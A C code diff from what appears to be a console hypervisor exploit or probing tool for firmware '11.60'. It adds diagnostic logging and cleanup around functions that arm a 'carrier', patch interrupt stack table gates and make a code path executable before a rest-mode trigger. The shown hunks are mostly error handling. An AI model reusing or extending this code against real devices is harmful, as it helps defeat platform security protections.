+      (unsigned long long)diag->armed_gate_lo,
+      (unsigned long long)diag->armed_gate_hi,
+      (unsigned long long)diag->live_gate_lo,
+      (unsigned long long)diag->live_gate_hi,
+      (unsigned long long)diag->live_state,
+      (unsigned long long)diag->active_slot, (unsigned)diag->ist_read_mask,
+      diag->debug_state, carrier_debug_state_name(diag->debug_state),
+      affinity_rc, cleanup_rc, ap_restore_rc, memory_cleanup_verified,
+      safe_without_cold_boot);
+  for (int cpu = 0; cpu < NCPU; cpu++)
+    if (diag->ist_read_mask & (1U << cpu))
+      used = appendf(text, sizeof(text), used, "live IST6[%02d] %016llx\n",
+                     cpu, (unsigned long long)diag->live_ist6[cpu]);
+  if (used >= sizeof(text))
+    return -1;
+  return write_unique_diagnostic_at_root(root, "carrier", text, used,
+                                         saved_path, saved_path_size);
 }
 
 static int save_report(const char *root, const char *model,
@@ -1407,6 +1792,7 @@ int main(void) {
   uint64_t code_lo, code_base;
   struct ap_path_state ap_path;
   struct tss_snapshot tss_snapshot;
+  struct carrier_diagnostic carrier_diag;
   struct census_report first, second;
   int pending_fd = -1;
   const int soc_id = sceKernelGetMainSocId();
@@ -1551,18 +1937,25 @@ int main(void) {
   }
 
   const int arm_rc = arm_startup_carrier(
-      hv_base, hv_size, scan_lo, scan_hi, code_base, saved_ists);
+      hv_base, hv_size, scan_lo, scan_hi, code_base, saved_ists,
+      &carrier_diag);
   if (arm_rc) {
     const int affinity_rc = restore_affinity();
     const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
     const int ap_restore_rc = restore_ap_path(&ap_path);
+    const int diagnostic_rc = save_carrier_diagnostic(
+        usb_root, model, arm_rc, &carrier_diag, affinity_rc, cleanup_rc,
+        ap_restore_rc, diagnostic_path, sizeof(diagnostic_path));
     const int pending_cleanup_rc =
-        affinity_rc || cleanup_rc || ap_restore_rc
+        affinity_rc || cleanup_rc || ap_restore_rc || diagnostic_rc ||
+                carrier_diag.debug_state != CARRIER_DEBUG_NOT_ARMED
             ? -1
             : remove_pending(usb_root, pending_path);
-    notify("11.60 census carrier refused to arm (%d); %s", arm_rc,
-           pending_cleanup_rc ? "pending retained, cold reboot required"
-                              : "carrier cleanup verified");
+    notify("11.60 census carrier refused to arm (%d, %s); %s", arm_rc,
+           carrier_failure_name(carrier_diag.failure),
+           pending_cleanup_rc
+               ? "pending retained, cold reboot required"
+               : "memory cleanup verified; private carrier diagnostic saved");
     return 1;
   }
 
@@ -1570,31 +1963,34 @@ int main(void) {
   sleep(5);
   const int ap_exec_rc = make_ap_path_executable(&ap_path);
   if (ap_exec_rc) {
+    record_carrier_failure(&carrier_diag, CARRIER_AP_NX_TRANSACTION, -1,
+                           ap_exec_rc, 0, 0, (uint64_t)ap_exec_rc);
     const int affinity_rc = restore_affinity();
     const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
     const int ap_restore_rc = restore_ap_path(&ap_path);
-    const int pending_cleanup_rc =
-        affinity_rc || cleanup_rc || ap_restore_rc
-            ? -1
-            : remove_pending(usb_root, pending_path);
-    notify("11.60 census refused: AP NX transaction failed (%d); %s",
+    const int diagnostic_rc = save_carrier_diagnostic(
+        usb_root, model, ap_exec_rc, &carrier_diag, affinity_rc, cleanup_rc,
+        ap_restore_rc, diagnostic_path, sizeof(diagnostic_path));
+    notify("11.60 census refused: AP NX transaction failed (%d); pending "
+           "retained, cold reboot required%s",
            ap_exec_rc,
-           pending_cleanup_rc
-               ? "pending retained, cold reboot required"
-               : "carrier cleanup and AP path restoration verified");
+           diagnostic_rc ? "; diagnostic save failed"
+                         : "; private carrier diagnostic saved");
     return 1;
   }
   if (enter_rest_mode(&rest_close_failed)) {
+    record_carrier_failure(&carrier_diag, CARRIER_SUSPEND_TRIGGER, -1, -1,
+                           0, 0, UINT64_MAX);
     const int affinity_rc = restore_affinity();
     const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
     const int ap_restore_rc = restore_ap_path(&ap_path);
-    const int pending_cleanup_rc =
-        affinity_rc || cleanup_rc || ap_restore_rc
-            ? -1
-            : remove_pending(usb_root, pending_path);
-    notify("11.60 census suspend trigger failed; %s",
-           pending_cleanup_rc ? "pending retained, cold reboot required"
-                              : "carrier cleanup verified");
+    const int diagnostic_rc = save_carrier_diagnostic(
+        usb_root, model, -1, &carrier_diag, affinity_rc, cleanup_rc,
+        ap_restore_rc, diagnostic_path, sizeof(diagnostic_path));
+    notify("11.60 census suspend trigger failed; pending retained, cold "
+           "reboot required%s",
+           diagnostic_rc ? "; diagnostic save failed"
+                         : "; private carrier diagnostic saved");
     return 1;
   }
 
@@ -1606,7 +2002,8 @@ int main(void) {
       notify("11.60 census report read failed; pending retained%s",
              affinity_rc || cleanup_rc || ap_restore_rc
                  ? ", cold reboot required"
-                 : ", cleanup verified; cold reboot required before retry");
+                 : ", memory cleanup verified; cold reboot required before "
+                   "retry");
       return 1;
     }
     if (first.state == CENSUS_STATE_DONE) {
@@ -1619,7 +2016,8 @@ int main(void) {
         notify("11.60 census report read failed; pending retained%s",
                affinity_rc || cleanup_rc || ap_restore_rc
                    ? ", cold reboot required"
-                   : ", cleanup verified; cold reboot required before retry");
+                   : ", memory cleanup verified; cold reboot required before "
+                     "retry");
         return 1;
       }
       if (!memcmp(&first, &second, sizeof(first)))
